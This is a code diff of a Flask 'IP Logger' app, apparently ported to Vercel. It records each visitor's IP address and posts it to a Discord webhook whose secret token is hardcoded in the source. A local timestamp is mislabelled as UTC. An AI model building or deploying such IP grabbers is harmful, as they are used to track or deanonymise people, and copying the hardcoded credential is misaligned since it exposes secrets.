@@ -5,50 +5,45 @@ import os
 
 app = Flask(__name__)
 
-# Trust the proxy (Railway uses 1 proxy layer)
-from werkzeug.middleware.proxy_fix import ProxyFix
-app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=1, x_prefix=1)
-
-WEBHOOK_URL = os.environ.get("WEBHOOK_URL")
+# Hardcoded Discord Webhook (as you wanted)
+WEBHOOK_URL = "https://ptb.discord.com/api/webhooks/1489458192877617183/O4zvTeV3pxjfNsPQQcmi3twgcMOGDkXjxbUNyfH5MZxFZhGhFf2GjK9BHW-Jd_8Y47Li"
 
 def get_client_ip():
-    """Get real client IP even behind Railway's proxy"""
-    # Try X-Forwarded-For first (most reliable on Railway)
-    forwarded = request.headers.get("X-Forwarded-For")
-    if forwarded:
-        # Take the first IP in the list (leftmost = real client)
-        return forwarded.split(",")[0].strip()
+    """Get real visitor IP on Vercel"""
+    # Vercel provides these headers
+    ip = request.headers.get('x-real-ip') or \
+         request.headers.get('x-forwarded-for')
     
-    # Fallbacks
-    return request.remote_addr or request.headers.get("X-Real-IP") or "Unknown"
+    if ip and ',' in ip:
+        ip = ip.split(',')[0].strip()   # Take the first (real) IP
+    
+    return ip or request.remote_addr or "Unknown"
 
-@app.route('/')
+@app.route('/', methods=['GET'])
 def log_ip():
     ip = get_client_ip()
-    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S UTC")
     
     data = {
-        "content": f"**IP Logged**\n**Time:** {now}\n**IP:** `{ip}`"
+        "content": f"**IP Logged (Vercel)**\n**Time:** {now}\n**IP:** `{ip}`"
     }
     
-    if WEBHOOK_URL:
-        try:
-            requests.post(WEBHOOK_URL, json=data, timeout=10)
-            print(f"✅ Webhook sent for IP: {ip}")   # This appears in Deploy Logs
-        except Exception as e:
-            print(f"❌ Webhook failed: {e}")
-    else:
-        print("⚠️  WEBHOOK_URL environment variable is not set!")
+    try:
+        requests.post(WEBHOOK_URL, json=data, timeout=10)
+        print(f"✅ Webhook sent for IP: {ip}")
+    except Exception as e:
+        print(f"❌ Webhook error: {e}")
     
-    # Better response so you know it worked
+    # Nice response for the visitor
     return f"""
-    <h2>IP Logger</h2>
-    <p>Your IP has been logged.</p>
+    <h2>✅ IP Logger Active</h2>
+    <p>Your IP has been logged to Discord.</p>
     <p><strong>Logged IP:</strong> {ip}</p>
-    <p>Time: {now}</p>
+    <p><strong>Time:</strong> {now}</p>
+    <hr>
+    <small>Powered by Flask on Vercel</small>
     """
 
+# This is needed for Vercel serverless functions
 if __name__ == "__main__":
-    port = int(os.environ.get("PORT", 5000))
-    print(f"🚀 Starting app on port {port}")
-    app.run(host="0.0.0.0", port=port)
+    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
